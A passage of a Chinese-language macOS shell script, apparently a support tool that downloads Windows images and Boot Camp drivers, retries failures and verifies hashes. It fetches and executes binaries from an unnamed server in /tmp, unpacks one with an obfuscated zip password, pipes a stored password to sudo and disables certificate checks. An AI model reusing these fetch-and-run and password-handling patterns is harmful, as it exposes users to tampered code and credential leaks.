		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$ip5/aria2c85.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1
	
else

	if [[ $modelxh = "10.8"* ]]; then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$ip5/aria2c85.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1
		
else

	if [[ $modelxh = "10.7"* ]]; then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$ip5/aria2c75.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1

else

	if [[ $modelxh = "10.6"* ]]; then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$ip5/aria2c65.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1
			

else
	if [[ $modelxh = "10.5"* ]]; then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$ip5/aria2c65.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1
			

else
	if [ ! -f "/tmp/aria2c" ]; 
	then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$ip5/aria2ccc.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1
	fi
	fi
	fi
	fi
	fi
	fi
	
	if [ ! -f "/tmp/aria2c" ]; then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$ip5/aria2ccc.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1
	fi
	

	rm -f "/tmp/aria2c.zip"
	
	fi
	
	
	if [ ! -f "/tmp/aria2c" ]; then
	clear && printf "\e[3J"
	echo
	echo
	read -t 2 -p "必要下载组件无法获取！！！" numcs
	if [ "$numcs" = "0" ]; then
	Customize
	fi
	Downloadzxc
	fi
	
	
clear && printf "\e[3J"	
echo	
#echo TeamViewerID: "\033[36m${TVID}\033[0m"
echo	
echo ID: "\033[36m${tbid}\033[0m"		
	if [ "$url2" ]; then
	echo
	echo "\033[34m正在下载驱动\"$name\"中，请等待...\033[0m"
	echo
	else
	echo
	echo "\033[34m正在下载系统\"$name\"中，请等待...\033[0m"	
	echo
	fi
	
	chmod a+x /tmp/aria2c
	
	if [ "$oldmm" ]; then
	echo
	/tmp/aria2c -c -o $name --check-certificate=false $url -d ~/Downloads/JG_Download
	else
	if [ "$dur" ]; then
	echo
	curl -# -C - -o ~/Downloads/JG_Download/$name --retry 8888 $url
	else
	echo
	/tmp/aria2c -c -s25 -x16 -m0 -o $name --check-certificate=false --console-log-level=warn --summary-interval=888888888 $url -d ~/Downloads/JG_Download
	fi
	fi
	
	clear && printf "\e[3J"
	
echo	
#echo TeamViewerID: "\033[36m${TVID}\033[0m"	
echo	
echo ID: "\033[36m${tbid}\033[0m"		
	if [ "$url2" ]; then
	rm -f /tmp/bootcamp.txt	
	echo
	echo "\033[34m正在下载系统\"$name2\"中，请等待...\033[0m"
	echo
	if [ "$oldmm" ]; then
	echo
	#/tmp/aria2c -c -s25 -x16 -m0 -o $name2 --max-download-limit=500K $url2 -d ~/Downloads/JG_Download
	/tmp/aria2c -c -o $name2 --check-certificate=false $url2 -d ~/Downloads/JG_Download
	else
	if [ "$dur" ]; then
	echo
	curl -# -C - -o ~/Downloads/JG_Download/$name2 --retry 8888 $url2
	else
	echo
	/tmp/aria2c -c -s25 -x16 -m0 -o $name2 --check-certificate=false --console-log-level=warn --summary-interval=888888888 $url2 -d ~/Downloads/JG_Download
	fi
	fi
	fi
	
	if [ "$url3" ]; then
	clear && printf "\e[3J"
	echo	
    #echo TeamViewerID: "\033[36m${TVID}\033[0m"
    echo	
    echo ID: "\033[36m${tbid}\033[0m"		
	echo
	echo "\033[34m正在PE系统\"$name3\"中，请等待...\033[0m"
	echo
	/tmp/aria2c -c -s25 -x16 -m0 -o $name3 --console-log-level=warn --summary-interval=888888888 $url3 -d ~/Downloads/JG_Download
	fi
	
	
	if [ -f "/tmp/bootcamp.txt" ]; then
	echo
	echo "\033[34m正在下载BootCamp驱动中，请等待...\033[0m"
	echo
	/tmp/aria2c -c -s25 -x16 -m0 -o --check-certificate=false --console-log-level=warn --summary-interval=888888888 --input-file=/tmp/bootcamp.txt -d ~/Downloads/JG_Download
	clear
	fi
	
	if [ -f ~/Downloads/JG_Download/"$name".aria2 ]; then
	clear && printf "\e[3J"
	echo
	read -t 2 -p "下载不完整，将自动重试下载...如果一直重复，请通知技术员" numcs
	if [ "$numcs" = "0" ]; then
	Customize
	fi
	Downloadzxc
	fi
	
	if [ -f ~/Downloads/JG_Download/"$name2".aria2 ]; then
	clear && printf "\e[3J"
	echo
	read -t 2 -p "下载不完整，将自动重试下载...如果一直重复，请通知技术员" numcs
	if [ "$numcs" = "0" ]; then
	Customize
	fi
	Downloadzxc
	fi	
	
	if [ -f ~/Downloads/JG_Download/"$name3".aria2 ]; then
	clear && printf "\e[3J"
	echo
	read -t 2 -p "下载不完整，将自动重试下载...如果一直重复，请通知技术员" numcs
	if [ "$numcs" = "0" ]; then
	Customize
	fi
	Downloadzxc
	fi
		
	if [ -f ~/Downloads/JG_Download/BootCampESD.pkg.aria2 ]; then
	clear && printf "\e[3J"	
	echo	
	read -t 2 -p "BootCamp下载不完整，将自动重试下载...如果一直重复，请通知技术员" numcs
	if [ "$numcs" = "0" ]; then
	Customize
	fi
	Downloadzxc
	fi

	if [ "$name" ]; then
	if [ ! -f ~/Downloads/JG_Download/"$name" ]; then
	clear && printf "\e[3J"
	echo
	read -t 2 -p "无法下载，将自动重试下载...如果一直重复，请通知技术员" numcs
	if [ "$numcs" = "0" ]; then
	Customize
	fi
	if [ "$numcs" = "1234" ]; then
	kaishi
	fi
	Downloadzxc
	fi
	fi
	
	if [ "$name2" ]; then
	if [ ! -f ~/Downloads/JG_Download/"$name2" ]; then
	clear && printf "\e[3J"
	echo
	read -t 2 -p "无法下载，将自动重试下载...如果一直重复，请通知技术员" numcs
	if [ "$numcs" = "0" ]; then
	Customize
	fi
	Downloadzxc
	fi
	fi
	
	if [ "$name3" ]; then
	if [ ! -f ~/Downloads/JG_Download/"$name3" ]; then
	clear && printf "\e[3J"
	echo
	read -t 2 -p "无法下载，将自动重试下载...如果一直重复，请通知技术员" numcs
	if [ "$numcs" = "0" ]; then
	Customize
	fi
	Downloadzxc
	fi
	fi
	
	
	if [ "$name" ]; then
    filesize="$(ls -l ~/Downloads/JG_Download/"$name" | awk '{ print $5 }')" 
    if [ "$filesize" -lt "1000000" ]; then
	clear && printf "\e[3J"
	echo
	rm -rf ~/Downloads/JG_Download/"$name"
	read -t 2 -p "下载文件有误，将自动重试下载...如果一直重复，请通知技术员" numcs
	if [ "$numcs" = "0" ]; then
	Customize
	fi
	Downloadzxc
	fi
	fi
 	
	if [ "$name2" ]; then
    filesize="$(ls -l ~/Downloads/JG_Download/"$name2" | awk '{ print $5 }')" 
    if [ "$filesize" -lt "1000000" ]; then
	clear && printf "\e[3J"
	echo
	rm -rf ~/Downloads/JG_Download/"$name2"
	read -t 2 -p "下载文件有误，将自动重试下载...如果一直重复，请通知技术员" numcs
	if [ "$numcs" = "0" ]; then
	Customize
	fi
	Downloadzxc
	fi
	fi
  	
	if [ "$name3" ]; then
    filesize="$(ls -l ~/Downloads/JG_Download/"$name3" | awk '{ print $5 }')" 
    if [ "$filesize" -lt "1000000" ]; then
	clear && printf "\e[3J"
	echo
	rm -rf ~/Downloads/JG_Download/"$name3"
	read -t 2 -p "下载文件有误，将自动重试下载...如果一直重复，请通知技术员" numcs
	if [ "$numcs" = "0" ]; then
	Customize
	fi
	Downloadzxc
	fi
	fi
 
 
if [ "$drvname" ]; then 
if [ "$SourceSHA1" ]; then
if [ ! -f ~/Downloads/JG_Download/"$SourceSHA1" ]; then
	echo
	echo "正在校验文件中..."
	TargetSHA1=$(shasum ~/Downloads/JG_Download/"$drvname"|awk '{print $1}')
	if [ "$TargetSHA1" = "$SourceSHA1" ]
	then
		clear && printf "\e[3J"
		echo
		echo "源文件SHA1 = $SourceSHA1"
		echo
		echo "目标文件SHA1 = $TargetSHA1"
		echo
		echo "SHA1校验结果：正确"
		echo "$TargetSHA1" > ~/Downloads/JG_Download/"$TargetSHA1"
	else
		clear && printf "\e[3J"
		echo
		echo "源文件SHA1 = $SourceSHA1"
		echo
		echo "目标文件SHA1 = $TargetSHA1"
		echo
		echo "SHA1校验结果：错误"
		echo
		rm -rf ~/Downloads/JG_Download/"$drvname"
		read -t 2 -p "MD5验证错误，已删除损坏的文件，将自动重新下载...如果一直重复，请通知技术员"
		#win_partition=${restore_device}
		#cxxz="1"
		Downloadzxc
	fi
	fi
fi
fi 
 
 
 
 
if [ "$xtname" ]; then 

if [ "$xtname" = "1809.dmg" ]; then
SourceMD5="b2d23fec595fb342151f56da6a049aa8"
Drvs="1809"
fi
if [ "$xtname" = "1909.dmg" ]; then
SourceMD5="78edbe456d012774391922bd0d033062"
Drvs="1809"
fi
if [ "$xtname" = "Win11.dmg" ]; then
SourceMD5="cb2ffd3aed1fed9ef3d7003be0a43fdc"
Drvs="1909"
fi
if [ "$xtname" = "Win8.dmg" ]; then
SourceMD5="01ae5481387e4ee4491d15c6e0e0a806"
fi
if [ ! -f ~/Downloads/JG_Download/"$SourceMD5" ]; then
	echo
	echo "正在校验文件中..."
	TargetMD5=$(md5 ~/Downloads/JG_Download/"$xtname")
	TargetMD5=${TargetMD5##* }
	if [ "$TargetMD5" = "$SourceMD5" ]
	then
		clear
		echo
		echo "源文件MD5 = $SourceMD5"
		echo
		echo "目标文件MD5 = $TargetMD5"
		echo
		echo "MD5校验结果：正确"
		echo "$TargetMD5" > ~/Downloads/JG_Download/"$TargetMD5"
	else
		clear
		echo
		echo "源文件MD5 = $SourceMD5"
		echo
		echo "目标文件MD5 = $TargetMD5"
		echo
		echo "MD5校验结果：错误"
		echo
		rm -rf ~/Downloads/JG_Download/"$xtname"
		read -t 2 -p "MD5验证错误，已删除损坏的文件，将自动重新下载...如果一直重复，请通知技术员"
		Downloadzxc
	fi
	fi
	
 fi
 
 
 
if [ "$xtname2" ]; then  
	
if [ "$xtname2" = "1809_HDD.dmg" ]; then
SourceMD5="5f3c340bfe4c0e825d38ed289238d045"
Drvs="1809"
fi

if [ "$xtname2" = "1909_HDD.dmg" ]; then
SourceMD5="2c2af9b269bfb72f7caecf2808a4a9b4"
Drvs="1909"
fi

if [ "$xtname2" = "Win11_HDD.dmg" ]; then
SourceMD5="0a6df24c17c2662238bc3ccd60d5396a"
Drvs="1909"
fi

if [ "$xtname2" = "Win8_HDD.dmg" ]; then
SourceMD5="923ea7e26cee67c0fb927706396ca502"
fi

if [ ! -f ~/Downloads/JG_Download/"$SourceMD5" ]; then
	echo
	echo "正在校验文件中..."
	TargetMD5=$(md5 ~/Downloads/JG_Download/"$xtname2")
	TargetMD5=${TargetMD5##* }
	if [ "$TargetMD5" = "$SourceMD5" ]
	then
		clear
		echo
		echo "源文件MD5 = $SourceMD5"
		echo
		echo "目标文件MD5 = $TargetMD5"
		echo
		echo "MD5校验结果：正确"
		echo "$TargetMD5" > ~/Downloads/JG_Download/"$TargetMD5"
	else
		clear
		echo
		echo "源文件MD5 = $SourceMD5"
		echo
		echo "目标文件MD5 = $TargetMD5"
		echo
		echo "MD5校验结果：错误"
		echo
		rm -rf ~/Downloads/JG_Download/"$xtname2"
		read -t 2 -p "MD5验证错误，已删除损坏的文件，将自动重新下载...如果一直重复，请通知技术员"
		Downloadzxc
	fi
	fi
fi
 
 
    
    	
	echo
	echo "\033[32m\"${name##*/}\"下载完成！\033[0m"
	echo
	echo
	
	
	if [ ! -f ~/Downloads/JG_Download/New7.dmg ];then
	if [ -f ~/Downloads/JG_Download/winclone7.dmg ];then
	echo
	echo "\033[34m正在解压文件\"${name2##*/}\"，请稍等...\033[0m"
	echo
	unzip -o ~/Downloads/JG_Download/winclone7.dmg -d ~/Downloads/JG_Download>/dev/null 2>&1
	mv ~/Downloads/JG_Download/winclone7/win7.winclone/boot.img.gz ~/Downloads/JG_Download/New7.dmg
	if [ ! -f ~/Downloads/JG_Download/New7.dmg ];then
	mv ~/Downloads/JG_Download/winclone7.dmg ~/Downloads/JG_Download/winclone7.zip
	if [ "$zip" ]; then
	curl -# -C - --connect-timeout 10 -o /tmp/unzip.zip "$ip5/unzip.zip">/dev/null 2>&1
	unzip -o "/tmp/unzip.zip" -d "/tmp">/dev/null 2>&1
	/tmp/zip.app/Contents/MacOS/Archive\ Utility ~/Downloads/JG_Download/winclone7.zip>/dev/null 2>&1 
	else
	/System/Library/CoreServices/Archive\ Utility.app/Contents/MacOS/Archive\ Utility ~/Downloads/JG_Download/winclone7.zip>/dev/null 2>&1 
    /System/Library/CoreServices/Applications/Archive\ Utility.app/Contents/MacOS/Archive\ Utility ~/Downloads/JG_Download/winclone7.zip>/dev/null 2>&1
    fi
    mv ~/Downloads/764通用.winclone/boot.img.gz ~/Downloads/JG_Download/New7.dmg
    mv ~/Downloads/JG_Download/764通用.winclone/boot.img.gz ~/Downloads/JG_Download/New7.dmg
    mv ~/Downloads/JG_Download/winclone7.zip ~/Downloads/JG_Download/winclone7.dmg
	fi
	rm -rf ~/Downloads/764通用.winclone
	rm -rf ~/Downloads/JG_Download/764通用.winclone
	rm -rf ~/Downloads/JG_Download/764-\%BF\%CB+.winclone
	rm -rf ~/Downloads/JG_Download/winclone7
	rm -rf ~/Downloads/JG_Download/"__MACOSX"
	echo "\033[34m解压完成\033[0m"
	fi
	fi
	

	if [ ! -f ~/Downloads/JG_Download/New10.dmg ];then
	if [ -f ~/Downloads/JG_Download/winclone10.dmg ];then
	echo
	echo "\033[34m正在解压文件\"${name2##*/}\"，请稍等...\033[0m"
	echo
	mv ~/Downloads/JG_Download/winclone10.dmg ~/Downloads/JG_Download/winclone10.zip
	/System/Library/CoreServices/Archive\ Utility.app/Contents/MacOS/Archive\ Utility ~/Downloads/JG_Download/winclone10.zip
	mv ~/Downloads/JG_Download/winclone10/win10pro.winclone/boot.img.gz ~/Downloads/JG_Download/New10.dmg
	rm -rf ~/Downloads/JG_Download/winclone10
	rm -rf ~/Downloads/JG_Download/"__MACOSX"
	mv ~/Downloads/JG_Download/winclone10.zip ~/Downloads/JG_Download/winclone10.dmg
	echo "\033[34m解压完成\033[0m"
	fi
	fi	
	
	if [ ! "$re700" ]; then
	if [ -f ~/Downloads/JG_Download/BootCamp.zip ];then
	echo
	else
	if [ "${name:0-4}" = ".zip" ]
	then
	clear && printf "\e[3J"
	if [ ! -f ~/Downloads/WindowsSupport/BootCamp/setup.exe ]; then
	echo
	echo "\033[34m正在解压文件\"${name##*/}\"，请稍等...\033[0m"
	echo
	unzip -o ~/Downloads/JG_Download/${name##*/} -d ~/Downloads/WindowsSupport>/dev/null 2>&1	
	echo "\033[34m解压完成\033[0m"
	#FenQu3
	Winxt
	fi
	fi
	fi
	fi
	
	if [ -f ~/Downloads/JG_Download/BootCampESD.pkg ]; then
	Bootcampzxc
	fi
	
	if [ "$name2" ]; then
	if [ -f ~/Downloads/JG_Download/"$name2" ]; then
	#FenQu3
	Winxt
	fi
	fi
	
	if [ -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
	#FenQu3
	Winxt
	fi

	if [ -f ~/Downloads/JG_Download/"$name" ]; then
	#FenQu3
	Winxt
	fi
	 
}


Bootcampzxc(){
clear && printf "\e[3J"

	
	if [ -f ~/Downloads/JG_Download/BootCampESD.pkg ]; then
	if [ ! -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
	if [ "$tarbc" ] ; then	
    echo
	#echo TeamViewerID: "\033[36m${TVID}\033[0m"
	echo	
    echo ID: "\033[36m${tbid}\033[0m"		
	echo
	echo
	echo "\033[34m正在提取Windows驱动，请等待...\033[0m"
	echo
	echo
	echo "$pass" | sudo -S sudo rm -rf /tmp/btbc>/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /tmp/Library>/dev/null 2>&1
	pkgutil --expand ~/Downloads/JG_Download/BootCampESD.pkg /tmp/btbc
	tar -xz -C /tmp -f /tmp/btbc/Payload>/dev/null 2>&1
	mkdir -p ~/Downloads/BootCamp
	mv /tmp/Library/Application\ Support/BootCamp/WindowsSupport.dmg ~/Downloads/BootCamp
	echo "$pass" | sudo -S sudo rm -rf /tmp/Library
	if [ ! -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
	read -t 30 -p "驱动文件不完整，30秒后将自动重新下载..."
	rm -rf ~/Downloads/JG_Download/BootCampESD.pkg
	Downloadzxc
	fi
	rm -rf ~/Downloads/JG_Download/BootCampESD.pkg
	hdiutil attach ~/Downloads/BootCamp/WindowsSupport.dmg
    if [ $? -ne 0 ] ; then
    if [ ! -e /Volumes/Boot\ Camp ]; then
    clear && printf "\e[3J"
    read -t 60 -p "驱动文件不完整，60秒后将自动重新下载..." numcs 
	if [ "$numcs" = "y" ]; then
	#FenQu3
	Winxt
	fi
	rm -rf ~/Downloads/BootCamp/WindowsSupport.dmg
    Downloadzxc
    fi
    fi
    diskutil eject /Volumes/Boot\ Camp
	#FenQu3
	Winxt
	fi
	fi
	fi
	
	if [ -f ~/Downloads/JG_Download/BootCampESD.pkg ]; then
	if [ "$tarbcc" ] ; then	
	/tmp/aria2c -c -s25 -x16 -m0 -o rar.zip $ip5/rar.zip -d /tmp
    unzip -o "/tmp/rar.zip" -d "/tmp">/dev/null 2>&1
    if [ ! -f "/tmp/unar" ]; then
    read -t 10 -p "安装工具$rar无法下载，10秒后自动重试..."
    Bootcampzxc
    fi
    echo
	#echo TeamViewerID: "\033[36m${TVID}\033[0m"
	echo	
    echo ID: "\033[36m${tbid}\033[0m"		
	echo
	echo
	echo "\033[34m正在提取Windows驱动，请等待...\033[0m"
	echo
	echo
	/tmp/unar ~/Downloads/JG_Download/BootCampESD.pkg -o ~/Downloads/JG_Download>/dev/null 2>&1 
	/tmp/7za -y x ~/Downloads/JG_Download/BootCampESD/Payload -o$HOME/Downloads/JG_Download/BootCampESD>/dev/null 2>&1
	/tmp/unar -f ~/Downloads/JG_Download/BootCampESD/Payload\~ -o ~/Downloads/JG_Download>/dev/null 2>&1
	mkdir -p ~/Downloads/BootCamp
	mv ~/Downloads/JG_Download/Payload\~/Library/Application\ Support/BootCamp/WindowsSupport.dmg ~/Downloads/BootCamp
	if [ ! -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
	read -s -n1 -p "无法提取，任意键重试..."
	rm -rf ~/Downloads/JG_Download/BootCampESD
	rm -rf /Users/mac/Downloads/JG_Download/Payload\~
	Bootcampzxc
	fi
	rm -rf ~/Downloads/JG_Download/BootCampESD
	rm -rf ~/Downloads/JG_Download/Payload\~
	rm -rf ~/Downloads/JG_Download/BootCampESD.pkg
	hdiutil attach ~/Downloads/BootCamp/WindowsSupport.dmg
    if [ $? -ne 0 ] ; then
    if [ ! -e /Volumes/Boot\ Camp ]; then
    clear && printf "\e[3J"
    read -t 30 -p "驱动文件不完整，30秒后将自动重新下载..." numcs 
	if [ "$numcs" = "y" ]; then
	FenQu3
	fi
    rm -rf ~/Downloads/BootCamp/WindowsSupport.dmg	
    Downloadzxc
    fi
    fi
    diskutil eject /Volumes/Boot\ Camp
	FenQu3
	fi
	fi
	
	if [ -f ~/Downloads/JG_Download/BootCampESD.pkg ]; then
	if [ -e ~/Downloads/JG_Download/pkg ]; then
	rm -r ~/Downloads/JG_Download/pkg
	rm -r ~/Downloads/JG_Download/Library
	fi
	clear && printf "\e[3J"
    echo
	#echo TeamViewerID: "\033[36m${TVID}\033[0m"
	echo	
    echo ID: "\033[36m${tbid}\033[0m"		
	echo
	echo
	echo "\033[34m正在提取Windows驱动，请等待...\033[0m"
	echo
	echo
	
	if [ ! "$tarbc" ] ; then	
	if [ ! -f "/tmp/cpbc" ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/bootcamp.zip $ip5/bootcamp.zip>/dev/null 2>&1
	unzip -o -P "${zxc:25:1}${zxc:31:1}${zxc:3:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}" "/tmp/bootcamp.zip" -d "/tmp">/dev/null 2>&1
	rm -f "/tmp/bootcamp.zip" 
	fi
	chmod a+x /tmp/cpbc
	/tmp/cpbc	
	if [ ! -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
	read -t 30 -p "驱动文件不完整，30秒后将自动重新下载..."
	Downloadzxc
	fi
	fi
	
	hdiutil attach ~/Downloads/BootCamp/WindowsSupport.dmg

    if [ $? -ne 0 ] ; then
    if [ ! -e /Volumes/Boot\ Camp ]; then
    clear && printf "\e[3J"
    rm -rf ~/Downloads/JG_Download/BootCampESD.pkg
    read -t 30 -p "驱动文件不完整，30秒后将自动重新下载..." numcs 
	if [ "$numcs" = "y" ]; then
	FenQu3
	fi
    rm -rf ~/Downloads/BootCamp/WindowsSupport.dmg
    Downloadzxc
    fi
	fi
	fi
	diskutil eject /Volumes/Boot\ Camp
    FenQu3
}


Download(){
	
	if [ "$scwj" ]; then
	rm -rf ~/Downloads/JG_Download >/dev/null 2>&1
	mkdir -p ~/Downloads/JG_Download >/dev/null 2>&1
	scwj=""
	fi
	
	if [ ! "$xcs" ]; then
	xcs="16"
	fi
	
	clear && printf "\e[3J"
	name="${name##*/}"
	unzip_name="${name%.*}"
    
    `echo "clear && printf "\e[3J"" > /tmp/err.sh
    echo "echo ID: "$tbid"" >> /tmp/err.sh
    echo "echo" >> /tmp/err.sh
    echo "echo "正在下载文件中，请等待..."" >> /tmp/err.sh
    echo "echo" >> /tmp/err.sh` 
    chmod a+x /tmp/err.sh
    
	if [[ $modelxh = "110.6"* ]]; then
	if [ "$name" ] ; then	
	if [ ! -f ~/Downloads/JG_Download/"$name" ]; then
	if [ ! -e /Applications/Maxthon.app ]; then
	curl -# -C - --connect-timeout 10 -o /tmp/m.dmg "http://dl.maxthon.cn/mac/Maxthon-4.1.3.5000.dmg"
	hdiutil attach /tmp/m.dmg
	cp -R /Volumes/Maxthon/Maxthon.app /Applications
	fi
	open -a "/Applications/Maxthon.app" "$url"
	Start_menu
	fi
	fi
	fi
	
	if [ "$lldow" = "1" ]; then
	if [ ! -e /Applications/Maxthon.app ]; then
	curl -# -C - --connect-timeout 10 -o /tmp/m.dmg "http://dl.maxthon.cn/mac/Maxthon-4.1.3.5000.dmg"
	hdiutil attach /tmp/m.dmg
	cp -R /Volumes/Maxthon/Maxthon.app /Applications
	fi
	open -a "/Applications/Maxthon.app" "$url"	
	Start_menu
	fi
	
    echo
	#echo TeamViewerID: "\033[36m${TVID}\033[0m"
	echo	
    echo ${zdys}ID: "\033[36m${tbid}\033[0m"		
	echo	
	echo $zdys"\033[34m正在下载文件\"$name\"中，请等待...\033[0m"
	

	if [ ! -f "/tmp/aria2c" ]; then
	
	if [[ $modelxh = "10.9"* ]]; then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$ip5/aria2c85.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1
	
else

	if [[ $modelxh = "10.8"* ]]; then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$ip5/aria2c85.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1
		
else

	if [[ $modelxh = "10.7"* ]]; then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$ip5/aria2c75.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1

else

	if [[ $modelxh = "10.6"* ]]; then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$ip5/aria2c65.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1
			

else
	if [[ $modelxh = "10.5"* ]]; then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$ip5/aria2c65.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1
			

else
	if [ ! -f "/tmp/aria2c" ]; 
	then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$ip5/aria2ccc.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1
	fi
	fi
	fi
	fi
	fi
	fi
	
	
	if [ ! -f "/tmp/aria2c" ]; then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$ip5/aria2ccc.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1
	fi
	

	rm -f "/tmp/aria2c.zip"
	
	fi
	
	
	
	if [ ! -f "/tmp/aria2c" ]; then
	clear && printf "\e[3J"
	echo
	echo
	read -t 2 -p "必要下载组件无法获取！！！" numcs
	if [ "$numcs" = "0" ]; then
	Customize
	fi
	Download
	fi
	
	
	
	
	
	
	chmod a+x /tmp/aria2c
	if [[ $modelxh = "10.6"* ]]; then
	echo
	/tmp/aria2c -c -o $name --check-certificate=false $url -d ~/Downloads/JG_Download
	else
	if [[ $modelxh = "10.5"* ]]; then
	echo
	/tmp/aria2c -c -o $name --check-certificate=false $url -d ~/Downloads/JG_Download
	else	
	if [ "$oldpe" ]; then
	echo
	curl -# -C - -o ~/Downloads/JG_Download/$name --retry 8888 $url
	else	
	if [ "$dur" ]; then
	echo
	curl -# -C - -o ~/Downloads/JG_Download/$name --retry 8888 $url
	else
	echo
	/tmp/aria2c -c -s25 -x$xcs -m0 -o $name --check-certificate=false --console-log-level=warn --summary-interval=888888888 $url -d ~/Downloads/JG_Download
	fi
	fi
	fi
	fi
	clear && printf "\e[3J"
	echo
	
	if [ "$url2" ]; then
    echo
	#echo TeamViewerID: "\033[36m${TVID}\033[0m"
	echo	
    echo ID: "\033[36m${tbid}\033[0m"		
	echo	
	echo "\033[34m正在下载文件\"$name2\"中，请等待...\033[0m"
	echo
	if [[ $modelxh = "10.6"* ]]; then
	/tmp/aria2c -c -o $name2 --check-certificate=false $url2 -d ~/Downloads/JG_Download
	else
	/tmp/aria2c -c -s25 -x16 -m0 -o $name2 --check-certificate=false --console-log-level=warn --summary-interval=888888888 $url2 -d ~/Downloads/JG_Download
	fi
	clear && printf "\e[3J"
	fi
	
	if [ ! -f ~/Downloads/JG_Download/"$name"  ]; then
	echo
	read -t 2 -p "未检测到下载文件，自动重试下载...如果一直重复，请通知技术员" numcs
	if [ "$numcs" = "0" ]; then
	Customize
	fi
	if [ ! "$mayc" ]; then
	if [ "$M1CPU" ]; then
	mayc="1"
	rm -f /tmp/aria2c
	curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$ip5/aria2cm1.zip">/dev/null 2>&1
	unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1	
	fi
	fi
	
	Download
	
	
	fi
	
	if [ -f ~/Downloads/JG_Download/"$name".aria2  ]; then
	echo
	read -t 2 -p "下载不完整，自动重试下载...如果一直重复，请通知技术员" numcs
	if [ "$numcs" = "0" ]; then
	Customize
	fi
	Download
	fi
		
	if [ "$url2" ]; then
	if [ ! -f ~/Downloads/JG_Download/"$name2"  ]; then
	echo
	read -t 2 -p "未检测到下载文件，自动重试下载...如果一直重复，请通知技术员" 
	Download
	fi
	
	if [ -f ~/Downloads/JG_Download/"$name2".aria2  ]; then
	echo
	read -t 2 -p "下载不完整，自动重试下载...如果一直重复，请通知技术员" numcs
	if [ "$numcs" = "0" ]; then
	Customize
	fi
	Download
	fi
	fi	


if [ -f ~/Downloads/JG_Download/"$name" ]; then
namesz=$(ls -l ~/Downloads/JG_Download/"$name" | awk '{print $5}')
if [ "$namesz" -lt "100000" ]; then
rm -rf ~/Downloads/JG_Download/"$name"
if [ "$ycmmaz" ]; then
clear && printf "\e[3J"
echo
echo
read -t 2 -p "已删除损坏的文件，自动重新下载...如果一直重复，请通知技术员"
Download
fi
clear && printf "\e[3J"
echo
echo
read -t 2 -p "已删除损坏的文件，自动重新下载...如果一直重复，请通知技术员"
Download
fi
fi

if [ -f ~/Downloads/JG_Download/"$name2" ]; then
namesz=$(ls -l ~/Downloads/JG_Download/"$name2" | awk '{print $5}')
if [ "$namesz" -lt "1000000" ]; then
rm -rf ~/Downloads/JG_Download/"$name2"
if [ "$ycmmaz" ]; then
clear && printf "\e[3J"
echo
echo
read -t 2 -p "已删除损坏的文件，自动重新下载...如果一直重复，请通知技术员"
Download
fi
clear && printf "\e[3J"
echo
echo
read -t 2 -p "已删除损坏的文件，自动重新下载...如果一直重复，请通知技术员"
Download
fi
fi
	
	if [ "$SourceSHA1" ]; then

if [ ! -f ~/Downloads/JG_Download/"$SourceSHA1" ]; then
	echo
	echo "正在校验文件中..."
	TargetSHA1=$(shasum ~/Downloads/JG_Download/"$xtname"|awk '{print $1}')
	if [ "$TargetSHA1" = "$SourceSHA1" ]
	then
		clear && printf "\e[3J"
		echo
		echo "源文件SHA1 = $SourceSHA1"
		echo
		echo "目标文件SHA1 = $TargetSHA1"
		echo
		echo "SHA1校验结果：正确"
		echo "$TargetSHA1" > ~/Downloads/JG_Download/"$TargetSHA1"
		echo
		clear && printf "\e[3J"
	else
		clear && printf "\e[3J"
		echo
		echo "源文件SHA1 = $SourceSHA1"
		echo
		echo "目标文件SHA1 = $TargetSHA1"
		echo
		echo "SHA1校验结果：错误"
		echo
		rm -rf ~/Downloads/JG_Download/"$xtname"
		read -t 2 -p "MD5验证错误，已删除损坏的文件，将自动重新下载...如果一直重复，请通知技术员"
		Download
	fi
	fi
	
fi
	
